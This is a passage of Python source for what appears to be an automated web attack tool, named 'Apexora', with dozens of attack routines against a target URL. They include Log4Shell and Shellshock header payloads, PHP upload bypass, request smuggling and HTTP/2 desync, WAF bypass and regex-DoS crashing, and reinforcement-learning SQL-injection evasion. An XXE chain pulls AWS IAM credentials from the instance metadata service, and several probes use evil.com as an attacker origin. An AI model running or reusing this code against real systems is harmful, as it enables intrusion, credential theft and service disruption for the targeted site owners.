            progress_bar("oauth", i, total, color=C_YEL)
        sep = "&" if "?" in t else "?"
        r = fetch(t + sep + p)
        loc = r.get("headers", {}).get("Location", "")
        if "evil.com" in loc and not is_blocked(r):
            f.append(enrich({
                "type": "oauth_redirect", "severity": "HIGH", "payload": p,
                "description": "Open redirect via OAuth redirect_uri",
                "evidence": f"Location header → {loc}"
            }))
    return f

def run_graphql_attack(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    pl = get_pl("graphql")
    total = len(pl) * 2
    i = 0
    for ep in ["/graphql", "/api/graphql"]:
        for q in pl:
            i += 1
            if verbose:
                progress_bar("graphql", i, total, color=C_YEL)
            r = fetch(base + ep, method="POST", body=json.dumps({"query": q}),
                      extra_headers={"Content-Type": "application/json"})
            if r.get("status") in (200, 201) and "__schema" in r.get("body", ""):
                f.append(enrich({
                    "type": "graphql_introspection", "severity": "MEDIUM",
                    "payload": q[:80],
                    "description": f"Introspection enabled at {ep}",
                    "evidence": f"HTTP {r.get('status')} · endpoint={ep}"
                }))
                break
    return f

def run_deserial_deser(t, verbose=False):
    f = []
    d = PAYLOADS.get("deserial", {})
    if not isinstance(d, dict):
        return f
    all_pl = [(lang, p) for lang, pls in d.items() if isinstance(pls, list) for p in pls]
    total = len(all_pl)
    for i, (lang, p) in enumerate(all_pl, 1):
        if verbose:
            progress_bar("deserial", i, total, color=C_RED)
        ctype = "application/x-java-serialized-object" if lang == "java" else "application/x-php"
        r = fetch(t, method="POST", body=p, extra_headers={"Content-Type": ctype})
        if r.get("status") in (500, 502) or "Exception" in r.get("body", ""):
            f.append(enrich({
                "type": f"deser_{lang}", "severity": "HIGH", "payload": p[:80],
                "description": f"Deserialization ({lang}) triggered exception",
                "evidence": f"HTTP {r.get('status')} · body={r.get('body','')[:150]}"
            }))
    return f

def run_proto_pollution(t, verbose=False):
    f = []
    pl = get_pl("proto-pollution")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("proto-pollution", i, total, color=C_YEL)
        r = fetch(t, method="POST", body=p, extra_headers={"Content-Type": "application/json"})
        if r.get("status") in (200, 201) and r.get("body_size", 0) > 0:
            f.append(enrich({
                "type": "proto_pollution", "severity": "MEDIUM", "payload": p,
                "description": "Prototype pollution payload accepted",
                "evidence": f"HTTP {r.get('status')} · body_size={r.get('body_size')}"
            }))
    return f

def run_log4shell(t, verbose=False):
    f = []
    pl = get_pl("log4j")
    collab = f"apexora_{int(time.time())}.test"
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("log4shell", i, total, color=C_RED)
        pp = p.replace("COLLAB", collab)
        r = fetch(t, extra_headers={"User-Agent": pp, "X-Api-Version": pp, "X-Forwarded-For": pp})
        if r.get("status") in (500, 502) or "jndi" in r.get("body", "").lower():
            f.append(enrich({
                "type": "log4shell", "severity": "CRITICAL", "payload": pp,
                "description": "JNDI lookup triggered (Log4Shell)",
                "evidence": f"HTTP {r.get('status')} · header_payload={pp[:60]}"
            }))
    return f

def run_spring4shell(t, verbose=False):
    f = []
    pl = get_pl("spring4shell")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("spring4shell", i, total, color=C_RED)
        r = fetch(t, method="POST", body=p, extra_headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern": p
        })
        if r.get("status") == 200:
            f.append(enrich({
                "type": "spring4shell_probe", "severity": "MEDIUM", "payload": "class.module",
                "description": "Spring4Shell classloader parameter accepted",
                "evidence": f"HTTP {r.get('status')} · parameter sent"
            }))
    return f

def run_shellshock(t, verbose=False):
    f = []
    pl = get_pl("shellshock")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("shellshock", i, total, color=C_RED)
        r = fetch(t, extra_headers={"User-Agent": p, "Referer": p, "Cookie": p})
        body = r.get("body", "")
        if "vulnerable" in body or "uid=" in body:
            f.append(enrich({
                "type": "shellshock", "severity": "CRITICAL", "payload": p,
                "description": "Bash function injection executed",
                "evidence": f"HTTP {r.get('status')} · body={body[:180]}"
            }))
    return f

def run_crlf_inject(t, verbose=False):
    f = []
    pl = get_pl("crlf")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("crlf", i, total, color=C_YEL)
        sep = "&" if "?" in t else "?"
        r = fetch(t + sep + "redirect=" + p)
        if "evil" in r.get("headers", {}).get("Set-Cookie", "") or "X-Injected" in r.get("headers", {}):
            f.append(enrich({
                "type": "crlf_injection", "severity": "HIGH", "payload": p,
                "description": "CRLF header injection created attacker-controlled header",
                "evidence": f"headers={dict(r.get('headers',{}))}"
            }))
    return f

def run_hpp(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}{p.path or '/'}"
    pl = get_pl("hpp")
    total = len(pl)
    for i, q in enumerate(pl, 1):
        if verbose:
            progress_bar("hpp", i, total, color=C_YEL)
        r = fetch(base + q)
        if r.get("status") in (200, 500) and not is_blocked(r):
            f.append(enrich({
                "type": "hpp", "severity": "LOW", "payload": q,
                "description": "Server accepted duplicate parameter (HPP)",
                "evidence": f"HTTP {r.get('status')}"
            }))
    return f

def run_cors_misconfig(t, verbose=False):
    f = []
    pl = get_pl("cors")
    total = len(pl)
    for i, origin in enumerate(pl, 1):
        if verbose:
            progress_bar("cors", i, total, color=C_YEL)
        r = fetch(t, extra_headers={"Origin": origin})
        acao = r.get("headers", {}).get("Access-Control-Allow-Origin")
        acac = r.get("headers", {}).get("Access-Control-Allow-Credentials")
        if acao in (origin, "*") and acac == "true":
            f.append(enrich({
                "type": "cors_misconfig", "severity": "HIGH", "payload": origin,
                "description": "CORS reflects untrusted Origin with credentials",
                "evidence": f"ACAO={acao} · ACAC={acac}"
            }))
    return f

def run_upload_bypass(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    pl = get_pl("upload")
    total = len(pl) * 2
    i = 0
    boundary = "----APEXORA"
    for name in pl:
        body = (
            f"--{boundary}\r\n"
            f"Content-Disposition: form-data; name=\"file\"; filename=\"{name}\"\r\n"
            f"Content-Type: application/x-php\r\n\r\n"
            f"<?php echo 'apexora_probe'; ?>\r\n"
            f"--{boundary}--\r\n"
        )
        for path in ["/upload", "/api/upload"]:
            i += 1
            if verbose:
                progress_bar("upload", i, total, color=C_RED)
            r = fetch(base + path, method="POST", body=body,
                      extra_headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
            if r.get("status") in (200, 201) and any(
                k in r.get("body", "").lower() for k in ["success", "uploaded", "url", "apexora_probe"]
            ):
                f.append(enrich({
                    "type": "upload_bypass", "severity": "CRITICAL", "payload": name,
                    "description": f"PHP upload accepted as '{name}'",
                    "evidence": f"HTTP {r.get('status')} · endpoint={path}"
                }))
                break
    return f

def run_ssi_inject(t, verbose=False):
    f = []
    pl = get_pl("ssi")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("ssi", i, total, color=C_RED)
        r = fetch(t, method="POST", body=p,
                  extra_headers={"Content-Type": "application/x-www-form-urlencoded"})
        body = r.get("body", "")
        if "uid=" in body or "root:" in body:
            f.append(enrich({
                "type": "ssi_injection", "severity": "CRITICAL", "payload": p,
                "description": "SSI directive executed",
                "evidence": f"HTTP {r.get('status')} · body={body[:180]}"
            }))
    return f

def run_fmt_string(t, verbose=False):
    f = []
    pl = get_pl("fmt")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("fmt-string", i, total, color=C_YEL)
        r = fetch(t, method="POST", body=f"input={quote(p)}",
                  extra_headers={"Content-Type": "application/x-www-form-urlencoded"})
        if "0x" in r.get("body", "") or r.get("status") in (500, 502):
            f.append(enrich({
                "type": "format_string", "severity": "HIGH", "payload": p,
                "description": "Format string specifier consumed by server",
                "evidence": f"HTTP {r.get('status')} · body={r.get('body','')[:150]}"
            }))
    return f

def run_idor_scan(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    pl = get_pl("idor")
    total = len(pl)
    for i, path in enumerate(pl, 1):
        if verbose:
            progress_bar("idor", i, total, color=C_YEL)
        r = fetch(base + path)
        if r.get("status") == 200 and not is_blocked(r) and r.get("body_size", 0) > 100:
            low = r.get("body", "").lower()
            if any(k in low for k in ["email", "password", "token", "api_key", "secret"]):
                f.append(enrich({
                    "type": "idor", "severity": "HIGH", "payload": path,
                    "description": "Unauthenticated access to sensitive record",
                    "evidence": f"HTTP {r.get('status')} · snippet={r.get('body','')[:150]}"
                }))
    return f

def run_mass_assign(t, verbose=False):
    f = []
    pl = get_pl("mass-assign")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("mass-assign", i, total, color=C_YEL)
        r = fetch(t, method="POST", body=p, extra_headers={"Content-Type": "application/json"})
        body = r.get("body", "").lower()
        if r.get("status") in (200, 201) and ("admin" in body or "true" in body):
            f.append(enrich({
                "type": "mass_assignment", "severity": "HIGH", "payload": p,
                "description": "Sensitive attribute accepted via request body",
                "evidence": f"HTTP {r.get('status')} · snippet={r.get('body','')[:150]}"
            }))
    return f

def run_subdomain_takeover(t, verbose=False):
    f = []
    h = urlparse(t if "://" in t else "https://" + t).hostname
    if not h:
        return f
    pl = get_pl("subdomain")
    total = len(pl)
    for i, sub in enumerate(pl, 1):
        if verbose:
            progress_bar("subdomain-takeover", i, total, color=C_RED)
        full = f"{sub}.{h}"
        try:
            socket.gethostbyname(full)
            r = fetch(f"https://{full}", timeout=5)
            if r.get("status") == 404 and any(
                k in r.get("body", "").lower() for k in ["no such app", "not found", "heroku", "github"]
            ):
                f.append(enrich({
                    "type": "subdomain_takeover", "severity": "HIGH", "payload": full,
                    "description": "Dangling CNAME points to unclaimed service",
                    "evidence": f"HTTP {r.get('status')} · subdomain={full}"
                }))
        except Exception:
            pass
    return f

def run_subdomain_enum(t, verbose=False):
    f = []
    h = urlparse(t if "://" in t else "https://" + t).hostname
    if not h:
        return f
    pl = get_pl("subdomain")
    total = len(pl)
    for i, sub in enumerate(pl, 1):
        if verbose:
            progress_bar("subdomain-enum", i, total, color=C_CYN)
        full = f"{sub}.{h}"
        try:
            ip = socket.gethostbyname(full)
            f.append(enrich({
                "type": "subdomain_found", "severity": "LOW", "payload": full,
                "description": f"Subdomain resolves to {ip}",
                "evidence": f"DNS A record = {ip}"
            }))
        except Exception:
            pass
    return f

def run_dns_rebind(t, verbose=False):
    f = []
    for rb in ["127.0.0.1.nip.io", "localtest.me"]:
        try:
            ip = socket.gethostbyname(rb)
            if ip in ("127.0.0.1", "::1"):
                f.append(enrich({
                    "type": "dns_rebind", "severity": "MEDIUM", "payload": rb,
                    "description": "Wildcard DNS resolves arbitrary subdomain to loopback",
                    "evidence": f"{rb} → {ip}"
                }))
        except Exception:
            pass
    return f

def run_race_condition(t, verbose=False):
    f = []
    results = []
    lock = threading.Lock()
    def _send():
        r = fetch(t, method="POST", body="action=redeem&code=GIFT",
                  extra_headers={"Content-Type": "application/x-www-form-urlencoded"})
        with lock:
            results.append(r)
    if verbose:
        print(f"  {_cyn('▶')} dispatching 20 parallel requests...")
    ts = [threading.Thread(target=_send) for _ in range(20)]
    for th in ts:
        th.start()
    for th in ts:
        th.join()
    succ = sum(1 for r in results if r.get("status") == 200 and not is_blocked(r))
    if succ > 1:
        f.append(enrich({
            "type": "race_result", "severity": "HIGH", "payload": f"{succ}/20 successes",
            "description": "TOCTOU race condition — operation succeeded multiple times",
            "evidence": f"{succ} of 20 requests returned HTTP 200"
        }))
    else:
        f.append(enrich({
            "type": "race_result", "severity": "INFO", "payload": f"{succ}/20",
            "description": "No race detected",
            "evidence": f"{succ} of 20 succeeded (threshold >1)"
        }))
    return f

def run_waf_bypass(t, verbose=False):
    f = []
    b = fetch(t)
    pl = get_pl("waf-bypass")
    total = len(pl)
    blocks = 0
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("waf-bypass", i, total, color=C_RED)
        sep = "&" if "?" in t else "?"
        r = fetch(t + sep + "id=" + p)
        if not is_blocked(r) and detect_err(r):
            f.append(enrich({
                "type": "waf_bypass", "severity": "CRITICAL", "payload": p,
                "description": "WAF bypass — payload reached DB and errored",
                "evidence": f"HTTP {r.get('status')} · DB error triggered"
            }))
        elif not is_blocked(r) and b.get("status") in (401, 403):
            f.append(enrich({
                "type": "waf_bypass", "severity": "HIGH", "payload": p,
                "description": "WAF bypass — got past baseline block",
                "evidence": f"baseline={b.get('status')} · injected={r.get('status')}"
            }))
        if is_blocked(r):
            blocks += 1
        if blocks >= 8:
            break
    return f

def run_waf_admin_probe(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    pl = get_pl("waf-admin-probe")
    total = len(pl)
    for i, path in enumerate(pl, 1):
        if verbose:
            progress_bar("waf-admin", i, total, color=C_YEL)
        r = fetch(base + path)
        if r.get("status") in (200, 201, 204) and not is_blocked(r):
            low = r.get("body", "").lower()
            if any(k in low for k in ["waf", "firewall", "rules", "admin", "login"]):
                f.append(enrich({
                    "type": "waf_admin_exposed", "severity": "HIGH", "payload": path,
                    "description": "WAF admin interface reachable without auth",
                    "evidence": f"HTTP {r.get('status')} · endpoint={path}"
                }))
    return f

def run_waf_break(t, verbose=False):
    f = []
    pl = get_pl("waf-break")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("waf-break", i, total, color=C_RED)
        try:
            sep = "&" if "?" in t else "?"
            r = fetch(t + sep + "x=" + quote(p[:5000], safe=""), timeout=20)
            if r.get("status") in (500, 502, 503) or r.get("error"):
                f.append(enrich({
                    "type": "waf_crash", "severity": "HIGH", "payload": f"payload {i}",
                    "description": f"WAF crashed under malformed input: {r.get('status')}",
                    "evidence": f"error={r.get('error') or r.get('status')}"
                }))
            elif r.get("time_ms") and r["time_ms"] > 8000:
                f.append(enrich({
                    "type": "waf_regex_dos", "severity": "CRITICAL", "payload": f"payload {i}",
                    "description": f"Regex backtracking DoS: {r['time_ms']}ms",
                    "evidence": f"response_time={r['time_ms']}ms"
                }))
        except Exception:
            pass
    return f

def run_waf_fingerprint(t, verbose=False):
    f = []
    b = fetch(t)
    if b.get("server"):
        f.append(enrich({
            "type": "waf_fingerprint", "severity": "LOW", "payload": b["server"],
            "description": f"Server header: {b['server']}",
            "evidence": f"Server: {b['server']}"
        }))
    probes = ["'", "' OR 1=1--", "<script>", "../../etc/passwd", "${7*7}"]
    for p in probes:
        sep = "&" if "?" in t else "?"
        r = fetch(t + sep + "x=" + quote(p, safe=""))
        if r.get("status") != b.get("status"):
            f.append(enrich({
                "type": "waf_behavior", "severity": "MEDIUM", "payload": p,
                "description": f"Behavior change: {b.get('status')} → {r.get('status')}",
                "evidence": f"probe='{p}' blocked"
            }))
            break
    return f

def run_waf_timeline(t, verbose=False):
    f = []
    timeline = []
    pl = get_pl("waf-timeline")
    total = len(pl)
    for i, p in enumerate(pl, 1):
        if verbose:
            progress_bar("waf-timeline", i, total, color=C_YEL)
        sep = "&" if "?" in t else "?"
        r = fetch(t + sep + "id=" + quote(p, safe=""))
        bl = is_blocked(r)
        timeline.append({"payload": p, "status": r.get("status"), "blocked": bl})
    first = next((i for i, x in enumerate(timeline) if x["blocked"]), None)
    f.append(enrich({
        "type": "waf_timeline", "severity": "INFO", "payload": f"{len(timeline)} probes",
        "description": f"First block at index {first}" if first is not None else "No blocks observed",
        "evidence": json.dumps(timeline)[:300]
    }))
    return f

def run_cache_inject(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    base = f"{p.scheme}://{p.netloc}"
    for path in ["/admin", "/wp-admin", "/.git/config"]:
        for i in range(2, len(path)):
            head, tail = path[:i], path[i:]
            for hdr in ["Accept", "X-Forwarded-Host", "Origin"]:
                r = fetch(base + head, extra_headers={hdr: tail})
                if r.get("status") in (200, 301, 302) and not is_blocked(r):
                    low = r.get("body", "").lower()
                    if any(k in low for k in ["admin", "dashboard", "config"]):
                        f.append(enrich({
                            "type": "cache_inject", "severity": "CRITICAL",
                            "payload": f"{head} + {hdr}: {tail}",
                            "description": "Cache poisoning caused privileged page render",
                            "evidence": f"HTTP {r.get('status')}"
                        }))
                        return f
    return f

def run_session_hijack(t, verbose=False):
    f = []
    b = fetch(t)
    cookies = b.get("headers", {}).get("Set-Cookie", "")
    if cookies:
        if "httponly" not in cookies.lower():
            f.append(enrich({
                "type": "missing_httponly", "severity": "HIGH", "payload": "Set-Cookie",
                "description": "Session cookie lacks HttpOnly flag",
                "evidence": f"cookie={cookies[:150]}"
            }))
        if "secure" not in cookies.lower() and t.startswith("https"):
            f.append(enrich({
                "type": "missing_secure", "severity": "HIGH", "payload": "Set-Cookie",
                "description": "Session cookie lacks Secure flag over HTTPS",
                "evidence": f"cookie={cookies[:150]}"
            }))
        if "samesite" not in cookies.lower():
            f.append(enrich({
                "type": "missing_samesite", "severity": "MEDIUM", "payload": "Set-Cookie",
                "description": "Session cookie lacks SameSite attribute",
                "evidence": f"cookie={cookies[:150]}"
            }))
    if not f:
        f.append(enrich({
            "type": "session_ok", "severity": "INFO", "payload": "cookie",
            "description": "Session cookies carry HttpOnly/Secure/SameSite",
            "evidence": "audited"
        }))
    return f

def run_headers_audit(t, verbose=False):
    f = []
    b = fetch(t)
    hd = {k.lower(): v for k, v in b.get("headers", {}).items()}
    for h in ["strict-transport-security", "x-content-type-options", "x-frame-options",
              "content-security-policy", "referrer-policy"]:
        if h not in hd:
            f.append(enrich({
                "type": "missing_header", "severity": "MEDIUM", "payload": h,
                "description": f"Security header missing: {h}",
                "evidence": f"header_absent={h}"
            }))
    if not f:
        f.append(enrich({
            "type": "headers_ok", "severity": "INFO", "payload": "5 headers",
            "description": "All recommended security headers present",
            "evidence": "audited"
        }))
    return f

def run_tls_audit(t, verbose=False):
    f = []
    h = urlparse(t if "://" in t else "https://" + t).hostname
    if not h:
        return f
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(socket.socket(), server_hostname=h)
        s.settimeout(5)
        s.connect((h, 443))
        c = s.cipher()
        v = s.version()
        s.close()
        if v in ("TLSv1", "TLSv1.1", "SSLv3"):
            f.append(enrich({
                "type": "weak_tls", "severity": "HIGH", "payload": v,
                "description": f"Deprecated TLS version negotiated: {v}",
                "evidence": f"version={v}"
            }))
        if c and c[0] and any(w in c[0] for w in ["RC4", "DES", "MD5"]):
            f.append(enrich({
                "type": "weak_cipher", "severity": "HIGH", "payload": c[0],
                "description": f"Weak cipher negotiated: {c[0]}",
                "evidence": f"cipher={c[0]}"
            }))
        f.append(enrich({
            "type": "tls_info", "severity": "INFO", "payload": v or "?",
            "description": f"TLS {v} · cipher={c[0] if c else '?'}",
            "evidence": "handshake ok"
        }))
    except Exception as e:
        f.append(enrich({
            "type": "tls_error", "severity": "LOW", "payload": "tls",
            "description": f"TLS handshake failed: {str(e)[:100]}",
            "evidence": "error"
        }))
    return f

def run_h2c_smuggle(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    try:
        s = socket.create_connection((p.hostname, p.port or 80), timeout=10)
        req = (
            f"GET / HTTP/1.1\r\nHost: {p.hostname}\r\n"
            f"Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\n"
            f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n\r\n"
        )
        s.sendall(req.encode())
        data = s.recv(4096)
        s.close()
        if b"101" in data:
            f.append(enrich({
                "type": "h2c_upgrade", "severity": "MEDIUM", "payload": "h2c upgrade",
                "description": "Server accepted cleartext HTTP/2 upgrade",
                "evidence": f"response={data[:80].decode('utf-8','ignore')}"
            }))
    except Exception as e:
        f.append(enrich({
            "type": "h2c_error", "severity": "LOW", "payload": "h2c",
            "description": f"Connection failed: {str(e)[:100]}",
            "evidence": "error"
        }))
    return f

def run_cl0_smuggle(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    try:
        s = socket.create_connection((p.hostname, p.port or 80), timeout=10)
        req = (
            f"POST / HTTP/1.1\r\nHost: {p.hostname}\r\n"
            f"Content-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n"
            f"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {p.hostname}\r\n\r\n"
        )
        s.sendall(req.encode())
        data = s.recv(8192)
        s.close()
        if data.count(b"HTTP/") > 1 or b"admin" in data.lower():
            f.append(enrich({
                "type": "cl0_smuggle", "severity": "CRITICAL", "payload": "CL.0 desync",
                "description": "Request smuggling via CL.0 desync",
                "evidence": f"response_length={len(data)} · contains_admin={'admin' in data.lower()}"
            }))
    except Exception as e:
        f.append(enrich({
            "type": "cl0_error", "severity": "LOW", "payload": "CL.0",
            "description": f"Connection failed: {str(e)[:100]}",
            "evidence": "error"
        }))
    return f

def run_http2_desync(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    h = p.hostname
    port = p.port or 443
    def _frame(ft, fl, sid, payload):
        return (struct.pack(">I", len(payload))[1:] + struct.pack(">B", ft) +
                struct.pack(">B", fl) + struct.pack(">I", sid & 0x7FFFFFFF) + payload)
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(socket.socket(), server_hostname=h)
        s.settimeout(10)
        s.connect((h, port))
        s.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
        sp = struct.pack(">HI", 0x03, 100) + struct.pack(">HI", 0x04, 65535)
        s.sendall(_frame(0x04, 0x00, 0, sp))
        time.sleep(0.1)
        hp = struct.pack(">B", 0x82) + struct.pack(">B", 0x86) + struct.pack(">B", 0x84)
        s.sendall(_frame(0x01, 0x04, 1, hp))
        s.sendall(_frame(0x00, 0x01, 1, b"test"))
        for _ in range(5):
            s.sendall(_frame(0x02, 0x00, 1, b""))
            s.sendall(_frame(0x01, 0x04, 3, hp))
        time.sleep(0.5)
        try:
            resp = s.recv(8192)
            if resp:
                f.append(enrich({
                    "type": "http2_desync", "severity": "MEDIUM", "payload": "h2 desync",
                    "description": "HTTP/2 desync probe received response",
                    "evidence": f"response_length={len(resp)}"
                }))
        except Exception:
            pass
        s.close()
    except Exception as e:
        f.append(enrich({
            "type": "http2_error", "severity": "LOW", "payload": "h2",
            "description": f"Connection failed: {str(e)[:100]}",
            "evidence": "error"
        }))
    return f

def run_websocket_attack(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    try:
        s = socket.create_connection((p.hostname, p.port or 80), timeout=10)
        key = base64.b64encode(os.urandom(16)).decode()
        req = (
            f"GET / HTTP/1.1\r\nHost: {p.hostname}\r\n"
            f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
            f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
            f"Origin: https://evil.com\r\n\r\n"
        )
        s.sendall(req.encode())
        data = s.recv(4096)
        s.close()
        if b"101" in data:
            f.append(enrich({
                "type": "ws_origin_bypass", "severity": "MEDIUM", "payload": "Origin: https://evil.com",
                "description": "WebSocket accepted cross-origin handshake",
                "evidence": f"HTTP 101 · Sec-WebSocket-Accept returned"
            }))
    except Exception as e:
        f.append(enrich({
            "type": "ws_error", "severity": "LOW", "payload": "ws",
            "description": f"Connection failed: {str(e)[:100]}",
            "evidence": "error"
        }))
    return f

def run_chain_xxe_aws(t, verbose=False):
    f = []
    payload = (
        '<?xml version="1.0"?><!DOCTYPE x ['
        '<!ENTITY e SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">'
        ']><x>&e;</x>'
    )
    r = fetch(t, extra_headers={"Content-Type": "application/xml"},
              method="POST", body=payload, timeout=20)
    m = re.search(r'"(AccessKeyId|SecretAccessKey|Token)"\s*:\s*"([^"]+)"', r.get("body", ""))
    if m:
        creds = {}
        for k in ["AccessKeyId", "SecretAccessKey", "Token"]:
            mm = re.search(rf'"{k}"\s*:\s*"([^"]+)"', r.get("body", ""))
            if mm:
                creds[k] = mm.group(1)
        f.append(enrich({
            "type": "xxe_imds_creds", "severity": "CRITICAL", "payload": "XXE→AWS IMDS",
            "description": "XXE to AWS IMDSv1 — full credential chain obtained",
            "evidence": f"AccessKeyId={creds.get('AccessKeyId','')[:20]}"
        }))
    else:
        f.append(enrich({
            "type": "xxe_no_creds", "severity": "INFO", "payload": "XXE→AWS IMDS",
            "description": "XXE payload did not return IMDS credentials",
            "evidence": f"HTTP {r.get('status')} · body={r.get('body','')[:100]}"
        }))
    return f

def run_rl_evade(t, verbose=False):
    f = []
    muts = [
        ("plain", "' OR 1=1--"),
        ("hex", "' OR 0x31=0x31--"),
        ("comment", "'/**/OR/**/1=1--"),
        ("case", "' oR 1=1--"),
        ("taut", "' OR (SELECT 7) LIKE 7--")
    ]
    q = {n: 0 for n, _ in muts}
    if verbose:
        print(f"  {_cyn('▶')} running 30 RL episodes...")
    for ep in range(30):
        name = random.choice(list(q.keys())) if random.random() < 0.2 else max(q, key=q.get)
        mp = next(p for n, p in muts if n == name)
        sep = "&" if "?" in t else "?"
        r = fetch(t + sep + "id=" + quote(mp, safe=""))
        reward = (0 if is_blocked(r) else 1.0) + (2.0 if detect_err(r) else 0)
        q[name] = q[name] * 0.9 + reward * 0.1
    best = max(q, key=q.get)
    best_payload = next(p for n, p in muts if n == best)
    f.append(enrich({
        "type": "rl_evasion", "severity": "HIGH" if q[best] > 1.0 else "MEDIUM",
        "payload": best_payload,
        "description": f"RL evasion: best mutation '{best}' (Q={q[best]:.2f})",
        "evidence": f"Q-table={json.dumps(q)[:200]}"
    }))
    return f

def run_origin_hunt(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    h = p.hostname
    if not h:
        return f
    cands = set()
    for sub in ["admin", "test", "dev", "api", "staging", "portal"]:
        try:
            ip = socket.gethostbyname(f"{sub}.{h}")
            if ip:
                cands.add((ip, f"sub_{sub}"))
        except Exception:
            pass
    baseline = fetch(t)
    found = False
    for ip, src in list(cands)[:15]:
        try:
            r = fetch(f"https://{ip}", extra_headers={"Host": h}, timeout=5)
            if (r.get("status") == baseline.get("status") and
                abs(r.get("body_size", 0) - baseline.get("body_size", 0)) < baseline.get("body_size", 0) * 0.1 and
                not r.get("error")):
                f.append(enrich({
                    "type": "origin_found", "severity": "CRITICAL",
                    "payload": f"{ip} via {src}",
                    "description": f"Origin IP reachable directly, bypassing CDN",
                    "evidence": f"Host header test matched baseline body ({baseline.get('body_size')} bytes)"
                }))
                found = True
        except Exception:
            pass
    if not found:
        f.append(enrich({
            "type": "origin_not_found", "severity": "INFO", "payload": f"{len(cands)} candidates",
            "description": "No origin IP exposed behind CDN",
            "evidence": "subdomain + Host header silent"
        }))
    return f

def run_recon_passive(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    h = p.hostname
    if not h:
        return f
    for path in ["/.env", "/.git/config", "/phpinfo.php", "/server-status", "/.DS_Store", "/backup.zip"]:
        r = fetch(f"{p.scheme}://{h}{path}", timeout=5)
        if r.get("status") in (200, 301) and r.get("body_size", 0) > 10:
            sev = "HIGH" if any(x in path for x in [".env", ".git"]) else "MEDIUM"
            f.append(enrich({
                "type": "exposed_file", "severity": sev, "payload": path,
                "description": f"Sensitive file exposed: {path}",
                "evidence": f"HTTP {r.get('status')} · size={r.get('body_size')} bytes"
            }))
    if not f:
        f.append(enrich({
            "type": "recon_clean", "severity": "INFO", "payload": h,
            "description": "No passive recon findings",
            "evidence": "6 probes silent"
        }))
    return f

def run_recon_active(t, verbose=False):
    f = []
    h = urlparse(t if "://" in t else "https://" + t).hostname
    if not h:
        return f
    ports = [21, 22, 23, 25, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 27017]
    total = len(ports)
    for i, port in enumerate(ports, 1):
        if verbose:
            progress_bar("port-scan", i, total, color=C_CYN)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.5)
            if s.connect_ex((h, port)) == 0:
                f.append(enrich({
                    "type": "open_port", "severity": "INFO", "payload": f"{h}:{port}",
                    "description": f"Port {port} open",
                    "evidence": "TCP connect succeeded"
                }))
            s.close()
        except Exception:
            pass
    if not f:
        f.append(enrich({
            "type": "recon_no_ports", "severity": "INFO", "payload": h,
            "description": "No open ports on common list",
            "evidence": f"{total} ports tested"
        }))
    return f

def run_cve_intel(t, verbose=False):
    f = []
    p = urlparse(t if "://" in t else "https://" + t)
    h = p.hostname
    scheme = p.scheme
    if not h:
        return f
    cves = list(CVE_DB.items())
    total = len(cves)
    for i, (cid, c) in enumerate(cves, 1):
        if verbose:
            progress_bar("cve-intel", i, total, color=C_RED)
        if c.get("protocol") != "http":
            f.append(enrich({
                "type": "cve_probe_only", "severity": "INFO", "payload": cid,
                "description": f"{c['product']} · protocol={c['protocol']} · not HTTP-probeable",
                "evidence": c.get("note", "requires non-HTTP protocol")
            }))
            continue
        try:
            url = f"{scheme}://{h}{c.get('probe', '/')}"
            r = fetch(url, timeout=10)
            det = c.get("detect", "")
            if det and det.lower() in r.get("body", "").lower():
                f.append(enrich({
                    "type": "cve_match", "severity": "HIGH" if c.get("rce") else "MEDIUM",
                    "payload": cid,
                    "description": f"{c['product']} signature detected",
                    "evidence": f"HTTP {r.get('status')} · detect='{det}' matched"
                }))
        except Exception:
            pass
    if not f:
        f.append(enrich({
            "type": "cve_clean", "severity": "INFO", "payload": f"{total} CVEs probed",
            "description": "No CVE signature matched",
